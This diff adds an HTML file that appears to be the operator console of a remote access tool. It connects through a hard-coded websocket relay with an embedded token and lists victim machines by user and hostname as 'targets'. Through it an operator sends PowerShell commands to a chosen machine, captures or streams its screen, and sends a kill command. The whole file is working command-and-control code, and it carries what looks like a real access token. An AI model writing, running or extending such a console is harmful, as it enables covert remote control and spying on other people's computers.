@@ -1,0 +1,132 @@
+<!-- operator.html — v3: 2-button screenshots, wired debug, ASCII-safe display -->
+<!doctype html>
+<html><head><meta charset="utf-8"><title>ops</title>
+<style>
+  body{font-family:ui-monospace,monospace;background:#111;color:#ddd;margin:0;padding:16px}
+  #hdr{display:flex;gap:8px;align-items:center;margin-bottom:12px;flex-wrap:wrap}
+  #agents{background:#1a1a1a;color:#0f0;border:1px solid #333;padding:6px;min-width:280px}
+  #out{background:#000;color:#9f9;border:1px solid #333;padding:8px;height:40vh;overflow:auto;white-space:pre-wrap;font-size:13px}
+  #cmd{width:100%;background:#000;color:#fff;border:1px solid #333;padding:8px;font-family:inherit}
+  button{background:#333;color:#fff;border:1px solid #555;padding:6px 10px;cursor:pointer}
+  button:hover{background:#444}
+  #shot{max-width:100%;border:1px solid #333;margin-top:12px;display:block;background:#000}
+  #status{color:#888;font-size:12px}
+</style></head>
+<body>
+<div id="hdr">
+  <button id="connect">connect</button>
+  <select id="agents"><option value="">-- pick target --</option></select>
+  <button id="shot1">Single Screenshot</button>
+  <button id="shot2">Stream ON</button>
+  <button id="shot3">Stream OFF</button>
+  <button id="kill">kill</button>
+  <span id="status">idle</span>
+</div>
+<div id="out"></div>
+<input id="cmd" placeholder="PowerShell — press Enter to send">
+<img id="shot" alt="">
+
+<script>
+const RELAY = "wss://operator-nmth.onrender.com/ws";   // FILL if different
+const TOKEN = "jf8CL2Cfgl3Wrfng1wbZ1aRXjEb225c8TCS/7HDbry0=";              // FILL: same RELAY_TOKEN
+
+const outEl = document.getElementById('out');
+const agentsEl = document.getElementById('agents');
+const shotEl = document.getElementById('shot');
+const statusEl = document.getElementById('status');
+let ws = null, attachedId = null, frames = 0, outs = 0;
+
+function log(s){ outEl.textContent += s + "\n"; outEl.scrollTop = outEl.scrollHeight; }
+function setStatus(s){ statusEl.textContent = s; }
+
+document.getElementById('connect').onclick = () => {
+  setStatus('connecting…');
+  ws = new WebSocket(`${RELAY}?role=operator&token=${encodeURIComponent(TOKEN)}`);
+  ws.onopen = () => {
+    setStatus('connected');
+    log("[ws] connected");
+    ws.send(JSON.stringify({op:'list'}));
+  };
+  ws.onclose = (e) => { setStatus('closed ' + (e.code||'')); log("[ws] closed " + (e.code||'')); };
+  ws.onerror  = ()  => { setStatus('error'); log("[ws] error"); };
+  ws.onmessage = (ev) => {
+    let m; try { m = JSON.parse(ev.data); } catch { return; }
+    if (m.op === 'agents') {
+      const cur = agentsEl.value;
+      agentsEl.innerHTML = '<option value="">-- pick target --</option>';
+      for (const a of (m.list||[])) {
+        const o = document.createElement('option');
+        o.value = a.id;
+        o.textContent = `${a.id}  (${a.info.user||'?'}@${a.info.hostname||'?'})`;
+        agentsEl.appendChild(o);
+      }
+      if (cur) agentsEl.value = cur;
+      setStatus(`agents: ${(m.list||[]).length}  attached: ${attachedId||'none'}  frames: ${frames}  outs: ${outs}`);
+    } else if (m.op === 'attached') {
+      attachedId = m.id;
+      log(`[attach] ${m.id}`);
+      setStatus(`attached: ${m.id}  frames: ${frames}  outs: ${outs}`);
+    } else if (m.op === 'err') {
+      log(`[err] ${m.reason}`);
+    } else if (m.op === 'out') {
+      outs++;
+      try {
+        const bin = atob(m.data);
+        const bytes = new Uint8Array(bin.length);
+        for (let i=0;i<bin.length;i++) bytes[i]=bin.charCodeAt(i);
+        log(new TextDecoder().decode(bytes));
+      } catch(e){ log("[out decode err] " + e.message); }
+      setStatus(`attached: ${attachedId}  frames: ${frames}  outs: ${outs}`);
+    } else if (m.op === 'frame') {
+      frames++;
+      shotEl.src = 'data:image/jpeg;base64,' + m.data;
+      setStatus(`attached: ${attachedId}  frames: ${frames}  outs: ${outs}`);
+    }
+  };
+};
+
+agentsEl.onchange = () => {
+  attachedId = agentsEl.value || null;
+  if (attachedId && ws && ws.readyState === 1) {
+    ws.send(JSON.stringify({op:'attach', id:attachedId}));
+  }
+};
+
+document.getElementById('cmd').addEventListener('keydown', (e) => {
+  if (e.key !== 'Enter') return;
+  const text = e.target.value; e.target.value = '';
+  if (!attachedId) { log("[no target]"); return; }
+  if (!ws || ws.readyState !== 1) { log("[ws down]"); return; }
+  const bytes = new TextEncoder().encode(text);
+  let bin = ''; for (const b of bytes) bin += String.fromCharCode(b);
+  ws.send(JSON.stringify({op:'in', data: btoa(bin)}));
+  log("> " + text);
+});
+
+// --- SCREENSHOT BUTTONS ---------------------------------------------------
+document.getElementById('shot1').onclick = () => {
+  if (!attachedId || !ws) { log("[no target]"); return; }
+  // one-shot: ask for a single frame
+  ws.send(JSON.stringify({op:'screenshotOnce'}));
+  log("[shot] single requested");
+};
+
+document.getElementById('shot2').onclick = () => {
+  if (!attachedId || !ws) { log("[no target]"); return; }
+  ws.send(JSON.stringify({op:'screenshot', on:true}));
+  log("[shot] stream ON");
+};
+
+document.getElementById('shot3').onclick = () => {
+  if (!attachedId || !ws) { log("[no target]"); return; }
+  ws.send(JSON.stringify({op:'screenshot', on:false}));
+  log("[shot] stream OFF");
+};
+
+document.getElementById('kill').onclick = () => {
+  if (!attachedId || !ws) return;
+  ws.send(JSON.stringify({op:'kill'}));
+  log("[kill] sent");
+};
+</script>
+</body></html>
